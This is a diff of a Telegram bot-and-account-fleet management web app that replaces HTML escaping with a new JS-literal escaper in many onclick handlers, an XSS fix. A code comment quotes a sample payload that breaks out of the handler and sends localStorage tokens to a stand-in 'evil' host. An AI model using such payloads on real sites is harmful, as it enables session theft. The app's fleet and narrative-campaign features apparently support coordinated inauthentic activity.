       txt('adIntelAdv', advs.map(a=>`
-      <div class="row${a.username?' tap':''}" ${a.username?`role="button" tabindex="0" onclick="openTgUser('${esc(a.username)}')"`:''}>
+      <div class="row${a.username?' tap':''}" ${a.username?`role="button" tabindex="0" onclick="openTgUser('${escJs(a.username)}')"`:''}>
         <div class="row-ico" style="background:var(--bg-violet-16)">🏢</div>
         <div class="row-body">
           <div class="row-name">${a.username?'@'+esc(a.username):'Рекламодатель'}</div>
@@ -24786,7 +24786,7 @@ async function openNetwork() {
             <div class="row-val">${ROLE_LABELS[b.role]||b.role||'—'}${b.swarm?' · ⚡ в рою ×'+Number(b.weight||1).toFixed(1).replace('.',','):''}</div>
           </div>
           <div class="row-right" style="display:flex;gap:5px;align-items:center">
-            <button class="btn btn-s" style="padding:5px 10px;font-size:12px;min-width:0" onclick="event.stopPropagation();openNetRoleModal(${b.bot_id},'${esc(b.name)}','${b.role||'general'}')">✏️ Роль</button>
+            <button class="btn btn-s" style="padding:5px 10px;font-size:12px;min-width:0" onclick="event.stopPropagation();openNetRoleModal(${b.bot_id},'${escJs(b.name)}','${b.role||'general'}')">✏️ Роль</button>
             <span class="chev">›</span>
           </div>
         </div>
@@ -24837,7 +24837,7 @@ async function openRelay(botId, botName) {
     const sessions = d.sessions||[];
     if (!sessions.length) { txt('relayList', empty('💬','Нет диалогов','Пользователи ещё не написали')); return; }
     txt('relayList', sessions.map(s=>`
-      <div class="row tap" onclick="openRelaySession(${s.id},'${esc(s.name)}')">
+      <div class="row tap" onclick="openRelaySession(${s.id},'${escJs(s.name)}')">
         <div class="row-ico" style="background:var(--bg-blue-16)">💬</div>
         <div class="row-body">
           <div class="row-name">${s.username?'@'+esc(s.username):esc(s.name)}</div>
@@ -25087,7 +25087,7 @@ function strikeNextStep1() {
   const cats = _STRIKE_STATUS?.categories || [];
   const SEVER_COLOR = {CRITICAL:'var(--red)',HIGH:'var(--orange)',MEDIUM:'var(--blue)'};
   document.getElementById('strikeCatGrid').innerHTML = cats.map(c=>
-    `<div class="mgmt-tile" onclick="strikeSelectCat('${esc(c.key)}','${esc(c.label)}')" style="border:1.5px solid transparent" id="scat-${esc(c.key)}">
+    `<div class="mgmt-tile" onclick="strikeSelectCat('${escJs(c.key)}','${escJs(c.label)}')" style="border:1.5px solid transparent" id="scat-${esc(c.key)}">
       <div class="mgmt-tile-ico" style="color:${SEVER_COLOR[c.severity]||'var(--text)'}">🚨</div>
       <div class="mgmt-tile-lbl">${esc(c.label)}</div>
     </div>`
@@ -25466,7 +25466,7 @@ async function loadWorkspaces() {
           <div class="row-val">${w.member_count} ${plural(w.member_count,'участник','участника','участников')} · ${WS_ROLE_RU[w.role]||WS_ROLE_RU.member}</div>
           ${w.description?`<div class="row-val" style="color:var(--hint)">${esc(w.description)}</div>`:''}
         </div>
-          <div class="row-right"><button class="btn btn-d" style="padding:5px 10px;min-width:0;font-size:12px" onclick="leaveWs(${w.id},'${esc(w.role)}')" aria-label="${w.role==='owner'?'Удалить пространство':'Выйти из пространства'}">${w.role==='owner'?'🗑':'🚪'}</button></div>
+          <div class="row-right"><button class="btn btn-d" style="padding:5px 10px;min-width:0;font-size:12px" onclick="leaveWs(${w.id},'${escJs(w.role)}')" aria-label="${w.role==='owner'?'Удалить пространство':'Выйти из пространства'}">${w.role==='owner'?'🗑':'🚪'}</button></div>
       </div>
     `).join(''));
   } catch(e) { txt('wsList', errHtml(errRu(e), 'loadWorkspaces()')); }
@@ -25515,12 +25515,12 @@ async function openWsDetail(wsId) {
         h += `<div class="card" style="margin-top:8px;background:var(--bg-green-16)">
           <div style="font-size:13px;color:var(--hint);margin-bottom:6px">Перешлите этот код тому, кого приглашаете. Войти по нему смогут ${num(_WS_INVITE.uses)} ${plural(_WS_INVITE.uses,'человек','человека','человек')} в течение ${num(_WS_INVITE.ttl)} ${plural(_WS_INVITE.ttl,'дня','дней','дней')}.</div>
           <div style="font-family:monospace;font-size:13px;word-break:break-all;user-select:all">${esc(_WS_INVITE.code)}</div>
-          <button class="btn btn-s" style="width:100%;margin-top:8px" onclick="copyToClipboard('${esc(_WS_INVITE.code)}','🔗 Код скопирован')">📋 Скопировать код</button>
+          <button class="btn btn-s" style="width:100%;margin-top:8px" onclick="copyToClipboard('${escJs(_WS_INVITE.code)}','🔗 Код скопирован')">📋 Скопировать код</button>
         </div>`;
       }
     }
     h += `<div style="display:flex;flex-direction:column;gap:8px;padding:12px 0">
-      <button class="btn btn-d" onclick="leaveWs(${wsId},'${esc(d.my_role||'member')}')">${d.my_role==='owner'?'🗑 Удалить пространство':'🚪 Выйти из пространства'}</button>
+      <button class="btn btn-d" onclick="leaveWs(${wsId},'${escJs(d.my_role||'member')}')">${d.my_role==='owner'?'🗑 Удалить пространство':'🚪 Выйти из пространства'}</button>
     </div>`;
     txt('wsdBody', h);
   } catch(e) { txt('wsdBody', errHtml(errRu(e), `openWsDetail(${Number(wsId)})`)); }
@@ -25764,7 +25764,7 @@ async function loadCleanerAccounts() {
     if (!accs.length) { txt('cleanerAccList', empty('📵','Нет аккаунтов с сессией','')); return; }
     txt('cleanerAccList', accs.map(a=>{
       const warn = a.asset_count>0 ? `<div class="row-val" style="color:var(--red)">⚠️ ${a.asset_count} управл. каналов</div>` : '';
-      return `<div class="row tap" onclick="selectCleanerAcc(${a.id},'${esc(a.name)}')" id="cleanerAcc-${a.id}">
+      return `<div class="row tap" onclick="selectCleanerAcc(${a.id},'${escJs(a.name)}')" id="cleanerAcc-${a.id}">
         <div class="row-ico" style="background:var(--bg-blue-16)">📱</div>
         <div class="row-body"><div class="row-name">${esc(a.name)}</div>${a.phone?`<div class="row-val">${esc(a.phone)}</div>`:''}${warn}</div>
         <div class="row-right chev">›</div>
@@ -26069,7 +26069,7 @@ async function openSwarm() {
           </div>
           <div class="row-right" style="flex-direction:column;gap:4px">
             <button class="btn ${r.swarm_enabled?'btn-o':'btn-g'}" style="padding:5px 10px;font-size:12px;min-width:0" onclick="swarmToggle(${Number(r.bot_id)},${r.swarm_enabled?'true':'false'})">${r.swarm_enabled?'Вывести':'В рой'}</button>
-            <button class="btn btn-s" style="padding:5px 10px;font-size:12px;min-width:0" onclick="swarmRole(${Number(r.bot_id)},'${esc(cluster)}')">Роль</button>
+            <button class="btn btn-s" style="padding:5px 10px;font-size:12px;min-width:0" onclick="swarmRole(${Number(r.bot_id)},'${escJs(cluster)}')">Роль</button>
           </div>
         </div>
       `;
@@ -26094,7 +26094,7 @@ async function openPresencePacks(keep) {
     const ppTotal = totalOf(d, rows);
     if (!rows.length) { txt('ppList', empty('📦','Пакетов нет','Нажмите + Создать')); return; }
     txt('ppList', rows.map(r=>`
-      <div class="row tap" onclick="openPpDetail(${r.id},'${esc(r.name)}')">
+      <div class="row tap" onclick="openPpDetail(${r.id},'${escJs(r.name)}')">
         <div class="row-ico" style="background:var(--bg-purple-16)">📦</div>
         <div class="row-body">
           <div class="row-name">${esc(r.name)}</div>
@@ -26218,7 +26218,7 @@ async function openPresenceMap() {
     // Плитки были просто числами. Теперь каждая ведёт туда, где с этим числом
     // можно что-то сделать: к аккаунтам, каналам, ботам, планам присутствия.
     txt('pmTotals', `
-      <div class="kpi-chip" onclick="pmCoverageHelp('${esc(String(cov.level||''))}')" role="button" tabindex="0"><div class="kpi-chip-val" style="color:${cl[1]}">${cl[0]}</div><div class="kpi-chip-lbl">охват гео</div></div>
+      <div class="kpi-chip" onclick="pmCoverageHelp('${escJs(String(cov.level||''))}')" role="button" tabindex="0"><div class="kpi-chip-val" style="color:${cl[1]}">${cl[0]}</div><div class="kpi-chip-lbl">охват гео</div></div>
       <div class="kpi-chip" onclick="goTab('accounts')" role="button" tabindex="0"><div class="kpi-chip-val">${num(cov.distinct_geo||0)}</div><div class="kpi-chip-lbl">стран флота</div></div>
       <div class="kpi-chip" onclick="goTab('channels')" role="button" tabindex="0"><div class="kpi-chip-val">${num(a.channels||0)}</div><div class="kpi-chip-lbl">каналов</div></div>
       <div class="kpi-chip" onclick="goTab('bots')" role="button" tabindex="0"><div class="kpi-chip-val">${num(a.bots||0)}</div><div class="kpi-chip-lbl">ботов</div></div>`);
@@ -26234,7 +26234,7 @@ async function openPresenceMap() {
     txt('pmGeo', list.length ? list.map(c=>{
       const w = Math.round(((c.accounts||0)/mx)*100);
       const dead = (c.accounts||0) - (c.active||0);
-      return `<div class="li tap" style="flex-direction:column;align-items:stretch" onclick="pmOpenCountry('${esc(String(c.code||''))}','${esc(String(c.title||c.name||c.code||''))}')" role="button" tabindex="0">
+      return `<div class="li tap" style="flex-direction:column;align-items:stretch" onclick="pmOpenCountry('${escJs(String(c.code||''))}','${escJs(String(c.title||c.name||c.code||''))}')" role="button" tabindex="0">
         <div style="display:flex;justify-content:space-between;font-size:13px;margin-bottom:4px;gap:8px"><b>${esc(c.title||c.code||'')}</b><span style="color:var(--hint);white-space:nowrap">${num(c.accounts||0)} ${plural(c.accounts||0,'аккаунт','аккаунта','аккаунтов')}${dead>0?' · '+num(dead)+' не в строю':''} ›</span></div>
         <div style="height:8px;background:var(--bg2);border-radius:6px;overflow:hidden"><div style="height:100%;width:${w}%;background:var(--accent)"></div></div>
       </div>`;
@@ -26246,7 +26246,7 @@ async function openPresenceMap() {
       const c = (d.presence.countries||{})[cc]||{};
       // Пробел растёт из плана присутствия — строка открывает сам план.
       const pl = (c.plans||[])[0];
-      const go = pl ? ` onclick="openGpDetail(${Number(pl.id)},'${esc(String(pl.name||''))}')" role="button" tabindex="0"` : '';
+      const go = pl ? ` onclick="openGpDetail(${Number(pl.id)},'${escJs(String(pl.name||''))}')" role="button" tabindex="0"` : '';
       return `<div class="row${pl?' tap':''}"${go}><div class="row-ico" style="background:var(--bg-yellow-16)">📍</div>
         <div class="row-body"><div class="row-name">${esc(c.title||c.name_ru||c.name||cc)}</div><div class="row-val">развёрнуто ${num(c.done||0)} из ${num(c.planned||0)} — ${num(c.pending||0)} в очереди${pl?' · '+esc(String(pl.name||'план')):''}</div></div>${pl?'<span class="chev">›</span>':''}</div>`;
     }).join('') : empty('✅','Пробелов нет','Всё запланированное присутствие развёрнуто. Новые страны добавляются планом гео-сети.',
@@ -26308,7 +26308,7 @@ async function openGlobalPresence(more) {
       const pct=total>0?Math.round(done/total*100):0;
       const [cls,lbl]=stb(r.status);
       return `
-        <div class="row tap" onclick="openGpDetail(${r.id},'${esc(r.name_pattern)}')">
+        <div class="row tap" onclick="openGpDetail(${r.id},'${escJs(r.name_pattern)}')">
           <div class="row-body">
             <div class="row-name">${esc(r.name_pattern)}</div>
             <div class="row-val">${GP_TYPES[r.asset_type]||r.asset_type||'—'} · <span class="badge ${cls}">${lbl}</span></div>
@@ -27088,7 +27088,7 @@ async function openEcosystems() {
     const rows = await api('/api/miniapp/ecosystems');
     if (!rows.length) { txt('ecoList', empty('🌐','Экосистем нет','Объедините активы в управляемую сеть',{label:'➕ Создать экосистему',fn:'openEcosystemModal()'})); return; }
     txt('ecoList', rows.map(r => `
-      <div class="row tap" onclick="openEcoDetail(${r.id},'${esc(r.name)}')">
+      <div class="row tap" onclick="openEcoDetail(${r.id},'${escJs(r.name)}')">
         <div class="row-ico" style="background:var(--bg-green-16)">${[...(ECO_TYPES[r.ecosystem_type]||'🌐')][0]}</div>
         <div class="row-body">
           <div class="row-name">${esc(r.name)}</div>
@@ -27181,7 +27181,7 @@ async function openEcoDetail(ecoId, ecoName) {
       html += members.map(m=>{
         const t = String(m.object_type||'').toLowerCase();
         const nm = m.name ? m.name : (ecoObjRu(t)+' #'+m.object_id);
-        return `<div class="row tap" onclick="ecoOpenMember('${esc(t)}',${Number(m.object_id)})">
+        return `<div class="row tap" onclick="ecoOpenMember('${escJs(t)}',${Number(m.object_id)})">
           <div class="row-ico" style="background:var(--bg-blue-16)">${ECO_OBJ_ICO[t]||'🌐'}</div>
           <div class="row-body">
             <div class="row-name">${esc(nm)}</div>
@@ -27189,7 +27189,7 @@ async function openEcoDetail(ecoId, ecoName) {
           </div>
           <div class="row-right" style="display:flex;gap:6px;align-items:center">
             <button class="btn btn-s" style="padding:5px 10px;font-size:12px;color:var(--red)"
-              onclick="event.stopPropagation();ecoDropMember('${esc(t)}',${Number(m.object_id)},'${esc(String(nm).replace(/'/g,''))}')"
+              onclick="event.stopPropagation();ecoDropMember('${escJs(t)}',${Number(m.object_id)},'${escJs(nm)}')"
               aria-label="Убрать из экосистемы">✕</button>
             <span class="chev">›</span>
           </div></div>`;
@@ -27491,7 +27491,7 @@ async function openVaPosts() {
       // Клик по посту ведёт в канал к посту. Нет ссылки (приватный без данных
       // или старый пост без msg_id) — честно показываем, строкой-тупиком не притворяемся.
       const canOpen = !!p.link;
-      const onclick = canOpen ? `onclick="openTgLink('${p.link}')" role="button" tabindex="0"` : '';
+      const onclick = canOpen ? `onclick="openTgLink('${escJs(p.link)}')" role="button" tabindex="0"` : '';
       const note = canOpen ? '' : (p.is_private
         ? '<div class="acc-phone" style="color:var(--hint)">🔒 приватный канал — ссылки нет</div>'
         : '<div class="acc-phone" style="color:var(--hint)">ссылка на пост недоступна</div>');
@@ -27548,8 +27548,8 @@ async function openGraph() {
           <div class="row-val" style="color:${col}">Пересечение ${pct.toFixed(1).replace('.',',')}% · общих ${num(r.shared_users||0)}</div>
           <div class="row-val" style="color:var(--hint)">${ago(r.computed_at)}</div>
           <div style="display:flex;gap:6px;margin-top:7px">
-            <button class="btn btn-s" style="font-size:11px;padding:5px 9px" onclick="openTgUser('${esc(String(r.username_a||''))}')">${esc(String(na).substring(0,16))} →</button>
-            <button class="btn btn-s" style="font-size:11px;padding:5px 9px" onclick="openTgUser('${esc(String(r.username_b||''))}')">${esc(String(nb).substring(0,16))} →</button>
+            <button class="btn btn-s" style="font-size:11px;padding:5px 9px" onclick="openTgUser('${escJs(String(r.username_a||''))}')">${esc(String(na).substring(0,16))} →</button>
+            <button class="btn btn-s" style="font-size:11px;padding:5px 9px" onclick="openTgUser('${escJs(String(r.username_b||''))}')">${esc(String(nb).substring(0,16))} →</button>
           </div>
         </div>
       </div>`;
@@ -27739,7 +27739,7 @@ async function loadMultigeo() {
           ${p.short_description?`<div class="row-val">💬 ${esc(p.short_description)}</div>`:''}
         </div>
         <div class="row-right">
-          <button class="btn btn-s" style="padding:5px 10px;font-size:12px" onclick="openMultigeoSetModal('${p.lang}','${esc(p.name||'')}','${esc(p.description||'')}','${esc(p.short_description||'')}')" aria-label="Изменить">✏️</button>
+          <button class="btn btn-s" style="padding:5px 10px;font-size:12px" onclick="openMultigeoSetModal('${p.lang}','${escJs(p.name||'')}','${escJs(p.description||'')}','${escJs(p.short_description||'')}')" aria-label="Изменить">✏️</button>
         </div>
       </div>
     `).join(''));
@@ -28037,7 +28037,7 @@ async function loadMeshDetail(meshId, status) {
     if (!targets.length) {
       h += empty('🎯','Получателей нет',
         'Пока не задан ни один канал-получатель, сеть читает источник впустую.',
-        {label:'+ Добавить канал', fn:`openMeshTargets(${meshId},'${esc(String(m.name||'').replace(/'/g,''))}')`});
+        {label:'+ Добавить канал', fn:`openMeshTargets(${meshId},'${escJs(m.name||'')}')`});
     } else {
       h += '<div class="lst">' + targets.map(t=>`
         <div class="li"><div class="li-body">
@@ -28048,7 +28048,7 @@ async function loadMeshDetail(meshId, status) {
           <button class="btn btn-s" style="padding:5px 10px;font-size:12px" onclick="toggleMeshTarget(${t.id},${meshId})">${t.enabled?'Пауза':'Включить'}</button>
           <span class="icon-btn sm danger" role="button" tabindex="0" aria-label="Убрать канал" onclick="deleteMeshTargetFrom(${t.id},${meshId}, this)">🗑</span>
         </div></div>`).join('') + '</div>';
-      h += `<div style="padding:8px 0"><button class="btn btn-s" style="width:100%" onclick="openMeshTargets(${meshId},'${esc(String(m.name||'').replace(/'/g,''))}')">+ Добавить канал-получатель</button></div>`;
+      h += `<div style="padding:8px 0"><button class="btn btn-s" style="width:100%" onclick="openMeshTargets(${meshId},'${escJs(m.name||'')}')">+ Добавить канал-получатель</button></div>`;
     }
     h += `<div class="sec" style="margin-top:8px">${st?esc(MESH_Q_RU[st]||st)+' — записи очереди':'Последние репосты'}${
       st?` · <span style="color:var(--accent);cursor:pointer" onclick="loadMeshDetail(${meshId})" role="button" tabindex="0">показать все</span>`:''}</div>`;
@@ -28243,7 +28243,7 @@ async function openNarrative(keep) {
     const typeLabel = {trend:'📈 Тренд',launch:'🚀 Запуск',awareness:'💡 Осведомлённость',counter:'⚔️ Контр'};
     const statusCls = {draft:'b-gy',active:'b-gr',paused:'b-or',completed:'b-bl',cancelled:'b-gy'};
     txt('narrativeList', rows.map(r => `
-      <div class="row tap" onclick="openNarrativeDetail(${r.id},'${esc(r.topic)}')">
+      <div class="row tap" onclick="openNarrativeDetail(${r.id},'${escJs(r.topic)}')">
         <div class="row-body">
           <div class="row-name">${esc(r.topic)}</div>
           <div class="row-val">${typeLabel[r.campaign_type]||r.campaign_type||'—'} · ${r.spread_hours||0}ч</div>
@@ -28593,7 +28593,7 @@ async function openSemanticMemory() {
       'Бот запоминает факты о собеседнике по ходу диалогов — как только они пойдут, они появятся здесь',
       {label:'🤖 К ботам', fn:"goTab('bots')"})); return; }
     txt('semList', rows.map(r => `
-      <div class="row tap" onclick="openSemFacts(${r.bot_id},'${esc(r.first_name||r.username||'Бот')}')">
+      <div class="row tap" onclick="openSemFacts(${r.bot_id},'${escJs(r.first_name||r.username||'Бот')}')">
         <div class="row-ico" style="background:var(--bg-purple-16)">🤖</div>
         <div class="row-body">
           <div class="row-name">${esc(r.first_name||'?')} ${r.username?'@'+esc(r.username):''}</div>
@@ -28700,7 +28700,7 @@ async function openAudienceDna() {
       const types = (r.best_content_types||[]).slice(0,3).join(', ')||'—';
       const botName = esc(r.first_name||r.username||'Бот');
       return `
-      <div class="row tap" onclick="openDnaDetail(${r.bot_id},'${botName}')">
+      <div class="row tap" onclick="openDnaDetail(${r.bot_id},'${escJs(r.first_name||r.username||'Бот')}')">
         <div class="row-ico" style="background:var(--bg-blue-16)">🤖</div>
         <div class="row-body">
           <div class="row-name">${esc(r.first_name||'?')} ${r.username?'@'+esc(r.username):''}</div>
@@ -28752,7 +28752,7 @@ function _renderDnaProfile(d) {
         <div class="li-sub wrap">Не заходили 14 дней и больше${risk>0?' · нажмите, чтобы написать именно им':''}</div></div>${risk>0?'<span class="chev">›</span>':''}</div>
     <div class="li"><div class="li-body"><div class="li-name">📈 Вовлечённость: ${esc(er)}</div>
       <div class="li-sub wrap">Лучшие форматы: ${esc(types)}</div></div></div>
-    <div class="li${topics.length?' tap':''}"${topics.length?` onclick="copyToClipboard('${esc(topics.join(', ')).replace(/'/g,"\\'")}','🏷️ Темы скопированы')" role="button" tabindex="0"`:''}>
+    <div class="li${topics.length?' tap':''}"${topics.length?` onclick="copyToClipboard('${escJs(topics.join(', '))}','🏷️ Темы скопированы')" role="button" tabindex="0"`:''}>
       <div class="li-body"><div class="li-name">🏷️ Темы аудитории</div>
         <div class="li-sub wrap">${esc(topics.join(', ')||'нет данных')}${topics.length?' · нажмите, чтобы скопировать':''}</div></div></div>
     <div class="li${bid?' tap':''}"${bid?` onclick="openBot(${bid})" role="button" tabindex="0"`:''}>
@@ -28844,7 +28844,7 @@ async function submitGlobalSearch(){
       const un=r.username?`<span style="opacity:.6">@${esc(r.username)}</span>`:'<span style="opacity:.4">без username</span>';
       const cnt=r.participants!=null?` · ${num(r.participants)}`:'';
       const link=r.username?`https://t.me/${esc(r.username)}`:'';
-      const open=link?`onclick="tg?.openTelegramLink?tg.openTelegramLink('${link}'):window.open('${link}')"`:'';
+      const open=link?`onclick="tg?.openTelegramLink?tg.openTelegramLink('${escJs(link)}'):window.open('${escJs(link)}')"`:'';
       return `<div class="row" style="cursor:${link?'pointer':'default'}" ${open}>
         <div style="font-size:20px;margin-right:8px">${ico[r.type]||'•'}</div>
         <div style="flex:1;min-width:0">
@@ -28886,7 +28886,7 @@ async function openAutoFunnels() {
       {label:'+ Создать воронку', fn:'openAutofunnelModal()'})); return; }
     const segLabels = AF_SEG_RU;
     txt('afList', rows.map(r => `
-      <div class="row tap" onclick="openFunnelSteps(${r.id},'${esc(r.name)}')">
+      <div class="row tap" onclick="openFunnelSteps(${r.id},'${escJs(r.name)}')">
         <div class="row-ico" style="background:var(--bg-green-16)">${r.enabled?'🟢':'🔴'}</div>
         <div class="row-body">
           <div class="row-name">${esc(r.name)}</div>
@@ -29267,6 +29267,20 @@ function esc(s) {
   // Пусто — только для null и undefined; ноль есть ноль.
   const t = (s === null || s === undefined) ? '' : String(s);
   return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+// Строка для JS-литерала ВНУТРИ обработчика в разметке: onclick="f('${escJs(x)}')".
+//
+// esc() тут НЕ защищает: браузер раскодирует &#39; в атрибуте обратно в ' ДО
+// запуска кода, и имя вида «x');fetch('//evil?'+localStorage…);//» выходит из
+// строки и исполняется с токеном владельца. escJs кодирует опасные символы
+// JS-экранами (\x27, \x22, \x3c…) — их HTML-разбор не трогает, а JS читает
+// как те же символы. Годится и в '…', и в "…" внутри атрибута.
+function escJs(s) {
+  const t = (s === null || s === undefined) ? '' : String(s);
+  return t.replace(/[\\'"<>&`\n\r\u2028\u2029]/g, c => {
+    const h = c.charCodeAt(0).toString(16);
+    return c.charCodeAt(0) > 0xff ? '\\u' + h.padStart(4, '0') : '\\x' + h.padStart(2, '0');
+  });
 }
 // Копирование в буфер обмена — единственная честная дверь.
 //
@@ -29923,7 +29937,7 @@ async function openBilling() {
 }
 function renderBillingPlans() {
     const chips = _tierList().map(t => `
-      <div class="card" style="flex:1;padding:10px 8px;min-height:auto;cursor:pointer;text-align:center;${t.key===window._tier?'border:1px solid rgba(167,139,250,.8);background:var(--bg-violet-16)':''}" onclick="pickTier('${esc(t.key)}')">
+      <div class="card" style="flex:1;padding:10px 8px;min-height:auto;cursor:pointer;text-align:center;${t.key===window._tier?'border:1px solid rgba(167,139,250,.8);background:var(--bg-violet-16)':''}" onclick="pickTier('${escJs(t.key)}')">
         <div style="font-weight:700;font-size:14px">${esc(t.name)}</div>
         <div style="font-size:13px;color:var(--accent)">$${esc(String(t.price))}/мес</div>
         <div style="font-size:11px;color:var(--hint)">${esc(t.accounts)}</div>
@@ -29931,7 +29945,7 @@ function renderBillingPlans() {
     const head = chips ? `<div style="font-size:12px;color:var(--hint);margin:0 2px 6px">Возможности у тарифов одинаковые — различается размер флота.</div>
       <div style="display:flex;gap:6px;margin-bottom:10px">${chips}</div>` : '';
     txt('billingPlansList', head + _PLAN_PRICES.map(p=>`
-      <div class="card" style="padding:14px 16px;margin-bottom:8px;min-height:auto;cursor:pointer;${p.popular?'border:1px solid rgba(167,139,250,.5)':''}" onclick="initPayment('${p.key}','${p.label}','${p.price}')">
+      <div class="card" style="padding:14px 16px;margin-bottom:8px;min-height:auto;cursor:pointer;${p.popular?'border:1px solid rgba(167,139,250,.5)':''}" onclick="initPayment('${escJs(p.key)}','${escJs(p.label)}','${escJs(p.price)}')">
         <div style="display:flex;align-items:center;justify-content:space-between">
           <div>
             <div style="font-weight:600;font-size:15px">${p.label} ${p.popular?'<span style="background:rgba(167,139,250,.3);border-radius:10px;padding:2px 7px;font-size:11px">Популярный</span>':''}</div>
@@ -30856,7 +30870,7 @@ async function loadWorkflows() {
       const statusLabels = { active: '🟢 Активен', running: '🔵 Выполняется', paused: '🟡 На паузе', failed: '🔴 Ошибка' };
       const color = statusColors[w.status] || 'var(--hint)';
       const lastRun = w.last_run ? ago(w.last_run) : 'не запускался';
-      return `<div class="li tap" onclick="openWorkflowDetail(${w.id},'${esc(w.name)}')">
+      return `<div class="li tap" onclick="openWorkflowDetail(${w.id},'${escJs(w.name)}')">
         <div class="ava" style="background:${color}15;color:${color}">🔄</div>
         <div class="li-body">
           <div class="li-name">${esc(w.name)}</div>
